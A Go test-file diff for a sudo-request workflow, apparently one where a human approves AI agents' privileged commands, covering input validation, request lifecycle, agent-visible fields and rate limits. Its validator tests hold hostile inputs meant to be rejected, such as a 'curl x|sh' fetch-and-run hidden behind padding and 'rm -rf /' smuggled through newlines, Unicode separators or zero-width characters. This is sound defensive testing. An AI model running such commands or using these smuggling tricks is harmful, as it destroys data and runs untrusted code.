@@ -2,6 +2,7 @@ package sudo
 
 import (
 	"context"
+	"encoding/json"
 	"errors"
 	"strings"
 	"sync"
@@ -52,7 +53,22 @@ func TestValidateCommand(t *testing.T) {
 		ok      bool
 	}{
 		{"simple", "apt-get install -y jq", true},
-		{"tab", "echo\tok", true},
+		{"single spaces", "apt-get install -y jq && echo ok", true},
+		{"two spaces", "echo  ok", true},
+		{"accents", "echo café", true},
+		{"tab", "echo\tok", false},
+		{"run of spaces hides a payload", "apt-get install jq" + strings.Repeat(" ", 300) + "; curl x|sh", false},
+		{"three spaces", "echo   ok", false},
+		{"run of no-break spaces", "echo \u00a0\u00a0\u00a0ok", false},
+		{"C1 control", "echo \u009b2J", false},
+		{"bidi override", "echo \u202eok", false},
+		{"bidi isolate", "echo \u2066ok\u2069", false},
+		{"zero width space", "rm\u200b -rf", false},
+		{"byte order mark", "\ufeffecho", false},
+		{"line separator", "true\u2028rm -rf /", false},
+		{"paragraph separator", "true\u2029rm -rf /", false},
+		{"1000 characters", strings.Repeat("é", MaxCommandRunes), true},
+		{"1001 characters", strings.Repeat("a", MaxCommandRunes+1), false},
 		{"empty", "", false},
 		{"blank", "   ", false},
 		{"newline hides a second command", "true\nrm -rf /", false},
@@ -66,6 +82,28 @@ func TestValidateCommand(t *testing.T) {
 		t.Run(tt.name, func(t *testing.T) {
 			if err := ValidateCommand(tt.command); (err == nil) != tt.ok {
 				t.Fatalf("ValidateCommand(%q) = %v, want ok=%v", tt.command, err, tt.ok)
+			}
+		})
+	}
+}
+
+func TestValidateReason(t *testing.T) {
+	tests := []struct {
+		name   string
+		reason string
+		ok     bool
+	}{
+		{"empty", "", true},
+		{"simple", "installer jq pour lire du JSON", true},
+		{"newline", "ok\nrm", false},
+		{"bidi", "ok \u202e", false},
+		{"run of spaces", "ok" + strings.Repeat(" ", 10) + "caché", false},
+		{"too long", strings.Repeat("a", MaxReasonBytes+1), false},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			if err := ValidateReason(tt.reason); (err == nil) != tt.ok {
+				t.Fatalf("ValidateReason(%q) = %v, want ok=%v", tt.reason, err, tt.ok)
 			}
 		})
 	}
@@ -96,8 +134,8 @@ func TestLifecycle(t *testing.T) {
 			return err
 		}
 	}
-	finish := func(s *Store, _ *clock, r *Request, _ *Grant) error {
-		updated, err := s.Finish(r.ID, Capture{Version: r.Version, ExitCode: 0, Output: "ok\n"})
+	closeTerminal := func(s *Store, _ *clock, r *Request, _ *Grant) error {
+		updated, err := s.Close(r.ID, Session{Version: r.Version, Duration: time.Minute, Reason: "exit"})
 		if err == nil {
 			*r = updated
 		}
@@ -112,14 +150,26 @@ func TestLifecycle(t *testing.T) {
 			return err
 		}
 	}
-	review := func(d Decision) func(*Store, *clock, *Request, *Grant) error {
-		return func(s *Store, _ *clock, r *Request, _ *Grant) error {
-			updated, err := s.Review(r.ID, d, alice, "")
-			if err == nil {
-				*r = updated
-			}
-			return err
+	done := func(s *Store, _ *clock, r *Request, _ *Grant) error {
+		updated, err := s.Done(r.ID, alice, "jq installé")
+		if err == nil {
+			*r = updated
 		}
+		return err
+	}
+	refuse := func(s *Store, _ *clock, r *Request, _ *Grant) error {
+		updated, err := s.Refuse(r.ID, alice, "pas maintenant")
+		if err == nil {
+			*r = updated
+		}
+		return err
+	}
+	reopen := func(s *Store, _ *clock, r *Request, _ *Grant) error {
+		updated, err := s.Reopen(r.ID, "peer sudo hors ligne")
+		if err == nil {
+			*r = updated
+		}
+		return err
 	}
 	advance := func(d time.Duration) func(*Store, *clock, *Request, *Grant) error {
 		return func(s *Store, c *clock, r *Request, _ *Grant) error {
@@ -136,8 +186,34 @@ func TestLifecycle(t *testing.T) {
 		{"happy path", []step{
 			{"approve", approve(1), StatusApproved, nil},
 			{"redeem", redeem(alice), StatusRunning, nil},
-			{"finish", finish, StatusAwaitingReview, nil},
-			{"send", review(DecisionSend), StatusDelivered, nil},
+			{"close", closeTerminal, StatusClosed, nil},
+			{"done", done, StatusDone, nil},
+		}},
+		{"done while the terminal is still open", []step{
+			{"approve", approve(1), StatusApproved, nil},
+			{"redeem", redeem(alice), StatusRunning, nil},
+			{"done", done, StatusDone, nil},
+			{"late close", closeTerminal, StatusDone, ErrInvalidState},
+		}},
+		{"refused after the terminal", []step{
+			{"approve", approve(1), StatusApproved, nil},
+			{"redeem", redeem(alice), StatusRunning, nil},
+			{"close", closeTerminal, StatusClosed, nil},
+			{"refuse", refuse, StatusRefused, nil},
+		}},
+		{"refused before anything", []step{
+			{"refuse", refuse, StatusRefused, nil},
+		}},
+		{"done needs a terminal", []step{
+			{"done", done, StatusPending, ErrInvalidState},
+			{"approve", approve(1), StatusApproved, nil},
+			{"done before redeem", done, StatusApproved, ErrInvalidState},
+		}},
+		{"a terminal that cannot open returns to the queue", []step{
+			{"approve", approve(1), StatusApproved, nil},
+			{"redeem", redeem(alice), StatusRunning, nil},
+			{"reopen", reopen, StatusPending, nil},
+			{"approve again", approve(1), StatusApproved, nil},
 		}},
 		{"edit then approve the new version", []step{
 			{"edit", edit(1, "apt-get install -y jq=1.7"), StatusPending, nil},
@@ -170,19 +246,16 @@ func TestLifecycle(t *testing.T) {
 			{"wait", advance(16 * time.Minute), StatusExpired, nil},
 			{"approve", approve(1), StatusExpired, ErrInvalidState},
 		}},
-		{"unreviewed output is withheld", []step{
+		{"no decision after the terminal expires", []step{
 			{"approve", approve(1), StatusApproved, nil},
 			{"redeem", redeem(alice), StatusRunning, nil},
-			{"finish", finish, StatusAwaitingReview, nil},
-			{"wait", advance(31 * time.Minute), StatusWithheld, nil},
+			{"close", closeTerminal, StatusClosed, nil},
+			{"wait", advance(31 * time.Minute), StatusExpired, nil},
 		}},
-		{"silent terminal fails", []step{
+		{"a silent terminal counts as closed", []step{
 			{"approve", approve(1), StatusApproved, nil},
 			{"redeem", redeem(alice), StatusRunning, nil},
-			{"wait", advance(17 * time.Minute), StatusFailed, nil},
-		}},
-		{"review before run is impossible", []step{
-			{"send", review(DecisionSend), StatusPending, ErrInvalidState},
+			{"wait", advance(17 * time.Minute), StatusClosed, nil},
 		}},
 	}
 	for _, tt := range tests {
@@ -204,70 +277,31 @@ func TestLifecycle(t *testing.T) {
 	}
 }
 
-func TestAgentView(t *testing.T) {
-	tests := []struct {
-		name       string
-		decision   Decision
-		edited     bool
-		status     Status
-		wantOutput bool
-		wantCode   bool
-	}{
-		{"send", DecisionSend, false, StatusDelivered, true, true},
-		{"exit code only", DecisionExitCode, false, StatusDelivered, false, true},
-		{"nothing", DecisionNothing, false, StatusWithheld, false, false},
-		{"modified", DecisionSend, true, StatusDelivered, true, true},
-	}
-	for _, tt := range tests {
-		t.Run(tt.name, func(t *testing.T) {
-			s, _ := newTestStore()
-			r := create(t, s, "id -u")
-			if tt.edited {
-				r, _ = s.Edit(r.ID, 1, "id -un", alice)
-			}
-			_, g, err := s.Approve(r.ID, r.Version, "peer-admin", alice)
-			if err != nil {
-				t.Fatal(err)
-			}
-			r, _ = s.Redeem(g.Token, alice)
-			if _, err := s.Finish(r.ID, Capture{Version: r.Version, ExitCode: 3, Output: "0\n"}); err != nil {
-				t.Fatal(err)
-			}
-			r, err = s.Review(r.ID, tt.decision, alice, "vu")
-			if err != nil {
-				t.Fatal(err)
-			}
-			view := r.View()
-			if view.Status != tt.status || (view.Output != "") != tt.wantOutput || (view.ExitCode != nil) != tt.wantCode {
-				t.Fatalf("view = %+v", view)
-			}
-			if view.CommandRequested != "id -u" || view.Modified != tt.edited {
-				t.Fatalf("command fields = %+v", view)
-			}
-		})
-	}
-}
-
-func TestViewHidesCaptureBeforeReview(t *testing.T) {
+func TestAgentViewHoldsOnlyStatusAndNote(t *testing.T) {
 	s, _ := newTestStore()
-	r := create(t, s, "id")
-	_, g, _ := s.Approve(r.ID, 1, "peer-admin", alice)
-	s.Redeem(g.Token, alice)
-	r, _ = s.Finish(r.ID, Capture{Version: 1, Output: "uid=0(root)"})
-	if view := r.View(); view.Output != "" || view.ExitCode != nil || view.Status != StatusAwaitingReview {
-		t.Fatalf("capture leaked before review: %+v", view)
+	r := create(t, s, "id -u")
+	r, _ = s.Edit(r.ID, 1, "id -un", alice)
+	_, g, err := s.Approve(r.ID, r.Version, "peer-admin", alice)
+	if err != nil {
+		t.Fatal(err)
 	}
-}
-
-func TestRerunRequiresNewApproval(t *testing.T) {
-	s, _ := newTestStore()
-	r := create(t, s, "false")
-	_, g, _ := s.Approve(r.ID, 1, "peer-admin", alice)
-	s.Redeem(g.Token, alice)
-	s.Finish(r.ID, Capture{Version: 1, ExitCode: 1})
-	r, err := s.Rerun(r.ID, 1, "true", alice)
-	if err != nil || r.Status != StatusPending || r.Version != 2 || r.Capture != nil {
-		t.Fatalf("Rerun = %+v, %v", r, err)
+	r, _ = s.Redeem(g.Token, alice)
+	if view := r.View(); view != (AgentView{ID: r.ID, Status: StatusRunning}) {
+		t.Fatalf("running view = %+v", view)
+	}
+	r, _ = s.Close(r.ID, Session{Version: r.Version, Reason: "exit"})
+	r, err = s.Done(r.ID, alice, "fait, uid 0")
+	if err != nil {
+		t.Fatal(err)
+	}
+	if view := r.View(); view != (AgentView{ID: r.ID, Status: StatusDone, Note: "fait, uid 0"}) {
+		t.Fatalf("final view = %+v", view)
+	}
+	data, _ := json.Marshal(r.View())
+	for _, field := range []string{"command", "output", "exit_code"} {
+		if strings.Contains(string(data), field) {
+			t.Fatalf("agent view leaks %q: %s", field, data)
+		}
 	}
 }
 
@@ -290,6 +324,25 @@ func TestLimitsPerHost(t *testing.T) {
 	if _, err := s.Create(CreateInput{Origin: Origin{HostID: "host-agents"}, Command: "true"}); !errors.Is(err, ErrTooMany) {
 		t.Fatalf("Create past limit = %v", err)
 	}
+}
+
+func TestLimitsCreationsPerHost(t *testing.T) {
+	s, c := newTestStore()
+	limits := DefaultLimits()
+	for range limits.MaxCreatesPerWindow {
+		r := create(t, s, "true")
+		if _, err := s.Cancel(r.ID, "host-agents"); err != nil {
+			t.Fatal(err)
+		}
+	}
+	if _, err := s.Create(CreateInput{Origin: Origin{HostID: "host-agents"}, Command: "true"}); !errors.Is(err, ErrTooMany) {
+		t.Fatalf("file-and-cancel loop not limited: %v", err)
+	}
+	if _, err := s.Create(CreateInput{Origin: Origin{HostID: "host-other"}, Command: "true"}); err != nil {
+		t.Fatalf("another host was limited: %v", err)
+	}
+	c.Advance(limits.CreateWindow)
+	create(t, s, "true")
 }
 
 func TestWaitReturnsOnFinalState(t *testing.T) {
